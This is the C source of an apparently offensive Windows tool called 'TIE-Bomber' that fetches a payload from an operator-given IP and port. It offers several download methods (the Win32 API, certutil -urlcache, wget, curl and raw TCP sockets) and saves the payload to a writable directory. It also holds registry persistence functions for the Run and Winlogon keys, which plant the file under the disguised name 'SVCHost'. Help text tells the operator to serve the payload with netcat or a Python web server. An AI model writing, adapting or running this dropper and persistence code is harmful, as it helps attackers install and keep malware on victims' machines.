#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdlib.h>
#include <ctype.h>
#include <urlmon.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#define PERS_NAME "SVCHost"
#define MAX_URL 2048
#define MAX_FILE 255

#define WIN_ERROR 0x0
#define CONTINUE_ERROR 0x1 
#define FAIL_ERROR 0x2
#define SUCCESS 0x3

typedef int (*ValidatorFunc)(char *arg, void *data);

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);
VOID TranslateErrorPrintImplStr(const char *errMsg, const char *file, int line);

VOID _ListOpts(const char *str, ...);
#define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)

#define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);
#define TranslateErrorPrintStr(errMsg) TranslateErrorPrintImplStr(errMsg, __FILE__, __LINE__);
typedef struct _WRITABLE_DIR {
    char path[MAX_PATH + 1];
} WRITABLE_DIR, *PWRITABLE_DIR;

typedef struct _DOWNLOAD_CONTEXT {
    char *ip;
    int ipLen;
    int port;
    char *sourceUrl;
    int sourceUrlLen;
    char *targetPath;
    int targetPathLen;
} DOWNLOAD_CONTEXT, *PDOWNLOAD_CONTEXT;

static BOOL printHelp = TRUE;

VOID _ListOpts(const char *str, ...) {
    int o=0;
    va_list arg;
    va_start(arg, str);
    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");
    while (str) {
        printf("[%d]: %s\n", ++o, str);
        str = va_arg(arg, const char *);
    }
    printf("[h]: List options again\n");
    printf("[q]: Quit program\n\n");

    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");

    va_end(arg);
}

BOOL ExecuteCommand(const char* command) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    int commandLen = strlen(command);
    char execCmdCopy[commandLen + 16];
    const char* cmd = "cmd.exe /C ";

    int cmdLen = strlen(cmd);
    memcpy(execCmdCopy, cmd, cmdLen);

    memcpy(execCmdCopy + cmdLen, command, commandLen);
    execCmdCopy[cmdLen + commandLen] = '\0';

    printf("[!] Executing: %s\n", execCmdCopy);

    BOOL rc = CreateProcessA(
        NULL,
        (LPSTR) execCmdCopy,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    if (rc == FALSE) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Check exit exit code
    DWORD exitCode = 0;
    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
        TranslateErrorPrint(GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exitCode != 0) {
        printf("[-] Command failed to execute (%lu). Try another option.\n", exitCode);
        return FALSE;
    }

    return TRUE;
}

BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data) {
    int rc;
    puts("");
    while (TRUE) {
        printf("TIE-Bomber(%s) > ", prompt);
        fflush(stdout);
        fgets(buffer, (int)bufferSize, stdin);
        buffer[strcspn(buffer, "\n")] = '\0';
        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0 || strcmp(buffer, "no") == 0 || strcmp(buffer, "n") == 0) {
                printf("\n[*] Exiting...\n");
                return FALSE;
        }
        if (validator && strcmp(buffer, "h") == 0) {
            printHelp = TRUE;
        }
        
        if (!validator) {
            if (strcmp(buffer, "y") == 0 || strcmp(buffer, "yes") == 0) {
                break;
            }
            continue;   
        }    

        rc = validator(buffer, data);
        if (rc == WIN_ERROR) {
            TranslateErrorPrint(GetLastError());
            continue;
        } else if (rc == CONTINUE_ERROR || rc == FAIL_ERROR) {
            continue;
        }
        break;
    }
    puts("");
    return TRUE;
}

BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
    if (*count >= *capacity) {
        *capacity = (*capacity == 0) ? 16 : (*capacity * 2);
        *array = realloc(*array, (*capacity) * sizeof(WRITABLE_DIR));
        if (!*array) {
            printf("[-] Allocation failed");
            return FALSE;
        }
    }
    
    strncpy((*array)[*count].path, path, pathLen);
    (*array)[*count].path[pathLen] = '\0';
    (*count)++;

    return TRUE;
}

VOID TranslateError(DWORD errCode, char **pErrMessage) {
	FormatMessageA(
	    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
	    NULL,
	    errCode,
	    0,
	    (LPSTR)pErrMessage,
	    0,
	    NULL);
}

VOID TranslateErrorPrintImplStr(const char* errMsg, const char *file, int line) {
    fprintf(stderr, "[-] ERROR at %s:%d: %s", file, line, errMsg);
}

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
    char* errMsg;
    TranslateError(errCode, &errMsg);
    fprintf(stderr, "[-] ERROR at %s:%d: %lu - %s", file, line, errCode, errMsg);
    LocalFree(errMsg);
}

BOOL FileExists(const char *path) {
	DWORD attrib = GetFileAttributesA(path);
	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}
    
BOOL IsExecutable(const char *path) {
	DWORD binaryType;
	LSTATUS stat = GetBinaryTypeA((LPCSTR)path, (LPDWORD)&binaryType);
	char *errMsg;
	DWORD errCode;
	if (stat == ERROR) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] Error: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	return TRUE;
}

BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
    DWORD rc = SearchPathA(
        NULL,
        binary,
        NULL,
        binaryPathSize,
        binaryPath,
        NULL
    );

    if (!rc) {
        printf("[-] Binary %s not found!\n", binary);
    }
    
    return rc;
}

BOOL IsResourceValid(const char *source) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", 
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    // Decrease the timeout
    DWORD timeout = 2000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hUrl = InternetOpenUrlA(hInternet, source, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        TranslateErrorPrintStr("Failed to create an URL object. Check whether the given url:port is valid");
        return FALSE;
    }
    
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (!HttpQueryInfoA(hUrl, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &size, NULL)) {
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hUrl);
        TranslateErrorPrintStr("HTTP Query failed");
        return FALSE;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (statusCode >= 200 && statusCode < 400) {
        return TRUE;
    } else {
        printf("[!] Resource is not available. Status code: %d\n", statusCode);
        printf("[?] To start a webserver for hosting your payload, run the following command inside the directory of your binary\n\t$ python3 -m http.server\n");
        return FALSE;
    }
}

BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
    printf("[*] Downloading the payload using Win32 API\n");
    printf("[*] Target path: %s\n", pDc->targetPath);
    HRESULT hResult = URLDownloadToFile(
        NULL,
        pDc->sourceUrl,
        pDc->targetPath,
        0, NULL
    );

    if (hResult != S_OK) {
        switch(hResult) {
            case INET_E_RESOURCE_NOT_FOUND:
                fprintf(stderr, "[-] No internet connection.\n");
                break;
            case INET_E_INVALID_URL:
                fprintf(stderr, "[-] Invalid URL.\n");
                break;
            case INET_E_DOWNLOAD_FAILURE:
                fprintf(stderr, "[-] Cannot write to destination path.\n");
                break;
            default:
                fprintf(stderr, "[-] Unknown error. HRESULT: 0x%08lX\n", hResult);
                break;
        }
        return FALSE;
    }

    return TRUE;
}

BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
    char certutilPath[MAX_PATH + 1];
    int certutilPathLen = LocateBinary(certutilPath, "certutil.exe", MAX_PATH);
    if (!certutilPathLen) {
        return FALSE;
    }

    printf("[*] Downloading the payload using certutil.exe\n");
    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -urlcache -split -f %s %s", certutilPath, pDc->sourceUrl, pDc->targetPath);
    return ExecuteCommand(command);
}

BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
    char wgetPath[MAX_PATH + 1];
    int wgetPathLen = LocateBinary(wgetPath, "wget.exe", MAX_PATH);
    if (!wgetPathLen) {
        return FALSE;
    }

    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -O %s %s", wgetPath, pDc->targetPath, pDc->sourceUrl);
    return ExecuteCommand(command);
    printf("[*] Downloading the payload using wget\n");
}

BOOL DownloadUsingCurl(const PDOWNLOAD_CONTEXT pDc) {
    char curlPath[MAX_PATH + 1];
    int curlPathLen = LocateBinary(curlPath, "curl.exe", MAX_PATH);
    if (!curlPathLen) {
        return FALSE;
    }

    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -o %s %s", curlPath, pDc->targetPath, pDc->sourceUrl);
    return ExecuteCommand(command);
    printf("[*] Downloading the payload using curl\n");
}

BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
    printf("[*] Downloading the payload using raw TCP sockets\n");
    
    WSADATA wsa;
    struct sockaddr_in serverAddr;
    char buffer[4096];
    int bufferSize = sizeof(buffer);
    int received;
    long long totalReceived = 0;
    FILE* f;
    char errMsg[1024];

    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        return FALSE;
    }

    serverAddr.sin_addr.s_addr = inet_addr(pDc->ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(pDc->port);
     
    if (connect(clientSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        TranslateErrorPrint(WSAGetLastError());
        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your file with the following command\n\t$ nc -nlvp <PORT> -q 1< <PAYLOAD>\n", pDc->ip, pDc->port);
        TranslateErrorPrintStr(errMsg);
        return FALSE;
    }

    f = fopen(pDc->targetPath, "wb");
    if (!f) {
        closesocket(clientSocket);
        snprintf(errMsg, sizeof(errMsg), "Failed to open %s\n", pDc->targetPath);
        TranslateErrorPrintStr(errMsg);
        return FALSE;
    }

    while ((received = recv(clientSocket, buffer, bufferSize, 0)) > 0) {
        fwrite(buffer, 1, received, f);
        totalReceived += received;
    }
    
    printf("[+] Successfully received %lu bytes of data\n", totalReceived);
    fclose(f);
    closesocket(clientSocket);
    WSACleanup();
    return TRUE;
}

int HandleDownload(char* opt, void *data) {
    PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
    
    if (printHelp) {
        ListOpts(
            "Download using Win32 API", 
            "Download using certutil.exe", 
            "Download using wget", 
            "Download using curl",
            "Download using raw TCP sockets"  
        );
        printHelp = FALSE;
        return CONTINUE_ERROR;
    }

    switch ((char) *opt) {
        case '0':
           break; 
        case '1':
            if (!DownloadUsingWin32(pDownloadContext)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '2':
            if (!DownloadUsingCertutil(pDownloadContext)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '3':
            if (!DownloadUsingWget(pDownloadContext)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '4':
            if (!DownloadUsingCurl(pDownloadContext)) {
                return FAIL_ERROR;
            }
            return SUCCESS;
        case '5':
            break;
        default:
            printf("[?] Unknown option specified. Select <h> for available options\n");
            return CONTINUE_ERROR;
    }
}

int HasWriteAccess(char *dirPath, void *data) {
    (void) data;

    char testPath[MAX_PATH + 1];
    if (dirPath[strlen(dirPath) - 1] != '\\') {
        dirPath[strlen(dirPath)] = '\\';
    }
    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
    
    wchar_t wTestPath[MAX_PATH + 1];
    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);


    HANDLE hFile = CreateFileW(
        wTestPath,
        FILE_WRITE_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return WIN_ERROR;
    }

    CloseHandle(hFile);
    return SUCCESS;
}

BOOL InjectRunRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Run registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Run registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL InjectWinlogonRegistry(const char *malwareFull, int malwareFullLen) {
	HKEY hKey = NULL;
	const char *REG = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	DWORD errCode;
	char *errMsg = NULL;

	// Get our handle to the registry
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)REG, 0, KEY_WRITE, &hKey);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while opening the Winlogon registry key: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	// Add to the registry key, the path to our malware
	result = RegSetValueEx(hKey, (LPCSTR)PERS_NAME, 0, REG_SZ, (unsigned char *)malwareFull, malwareFullLen);
	if (result != ERROR_SUCCESS) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] An error occured while setting registry key: %s\n", errMsg);
		LocalFree(errMsg);
		RegCloseKey(hKey);
		return FALSE;
	}

	printf("Winlogon registry key set for: %s\n", malwareFull);
	return TRUE;
}

BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive) {
	int opt;
	int iFlag = 0, eFlag = 0, tFlag = 0;
	*port = 80;
	while ((opt = getopt(argc, argv, "i:e:t:p:s")) != -1) {
		switch (opt) {
			case 'i':
				*ipLen = strlen(optarg);
				memcpy(ip, optarg, *ipLen);
				ip[*ipLen] = '\0';
                iFlag = 1;
				break;
			case 'e':
				*exeLen = strlen(optarg);
				memcpy(exe, optarg, *exeLen);
				exe[*exeLen] = '\0';
				eFlag = 1;
				break;
            case 't':
                *targetLen = strlen(optarg);
                memcpy(target, optarg, *targetLen);
                target[*targetLen] = '\0';
                tFlag = 1;
                break;
			case 'p':
				BOOL valid = TRUE;
				for (int i = 0; optarg[i]; i++) {
					if (!isdigit((unsigned char)optarg[i])) {
						valid = FALSE;
						break;
					}
				}
				if (valid) {
					*port = atoi(optarg);
				} else {
					printf("[-] Invalid port specified\n");
					return FALSE;
				}
                break;
            case 's':
                *socketReceive = TRUE;
            break;
			default:
				return FALSE;
				break;
		}
	}
	if (!iFlag || !eFlag) {
		return FALSE;
	}
    if (!tFlag) {
        *targetLen = *exeLen;
        strncpy(target, exe, (*exeLen) + 1);
    }
	return TRUE;
}

int main(int argc, char* argv[]) {
	char payloadFull[MAX_PATH]; // How it will be saved inside the machine
	int payloadFullLen;
	char exe[MAX_FILE + 1];
    char ip[256];
    char target[MAX_FILE + 1];
    int ipLen;
	int exeLen;
    int targetLen; 
    int port; 
    char source[MAX_URL + 1];
    char targetDirTmp[MAX_PATH + 1];
    char opt[16];
    BOOL receiveUsingSocket;

    char *errMsg;
    DWORD errCode;

    WRITABLE_DIR *wdirs = NULL;
    int capacity = 16, count = 0;
    
	if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
		exit(1);
	}
    
    if (!receiveUsingSocket) {
      	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
    	printf("[*] Source to extract payload from: %s\n", source);
        printf("[*] Checking whether resource is accessible\n");
        if (!IsResourceValid(source)) {
            if (!PromptUntilValid("Continue[y/n]", opt, sizeof(opt), NULL, NULL)) {
                exit(1);
            }
        }
    } else {
        printf("[*] Will be received using TCP socket. Host: %s:%d\n", ip, port);
    }
 
    if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
        exit(1); 
    }
    
    char targetDir[MAX_PATH + 1];
    int targetDirLen = GetFullPathNameA(targetDirTmp, MAX_PATH, targetDir, NULL);
    if (!targetDirLen) {
        TranslateErrorPrint(GetLastError());
        exit(1);
    }

    memcpy(payloadFull, targetDir, targetDirLen);
    memcpy(payloadFull + targetDirLen, target, targetLen);
    payloadFull[targetDirLen + targetLen] = '\0';
    payloadFullLen = strlen(payloadFull);

    printf("[*] Payload will be dropped as %s\n", payloadFull);
 
    // Check if file exists
    if (FileExists(payloadFull)) {
        if (!PromptUntilValid("Overwrite[y/n]", opt, sizeof(opt), NULL, NULL)) {
            exit(1);
        }
    }

    DOWNLOAD_CONTEXT downloadContext = {
        .ip = ip,
        .ipLen = ipLen,
        .port = port,
        .targetPath = payloadFull,
        .targetPathLen = payloadFullLen
    };

    if (!receiveUsingSocket) {
        printf("\n\n[*] **DOWNLOAD OPTION**\n\n");
        downloadContext.sourceUrl = source;
        downloadContext.sourceUrlLen = strlen(source);
        HandleDownload(NULL, NULL);
        if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
            exit(1);
        }
    } else {
        if (!DownloadUsingTCPSocket((PDOWNLOAD_CONTEXT) &downloadContext)) {
            exit(1);
        }
    }

    printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n"); 
/*
	if (!FileExists(malware)) {
	    printf("[-] The malware does not exists\n");
	    return 1;
	}

	GetFullPathName(malware, MAX_PATH, malwareFull, NULL);
	malwareFullLen = strlen(malwareFull);
	malwareFull[malwareFullLen] = '\0';

	if (!IsExecutable(malwareFull)) {
	    return 1;
	}
	printf("[+] Valid malicious executable: %s\n[+] Starting to apply persistence techniques\n", malwareFull);
	*/
	// Try registry run key
	/*
	if (!InjectRunRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Run Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Run Registry successful\n"); return 0; } */
	// Abusing Registry key used by Winlogon process
	/*
	if (!InjectWinlogonRegistry(malwareFull, malwareFullLen)) {
	    printf("[-] Persistence via Winlogon Registry failed. Trying the next one\n");
	} else {
	    printf("[+] Persistence via Winlogon Registry successful\n");
	    return 0;
	}
	*/
    
	return 0;
}
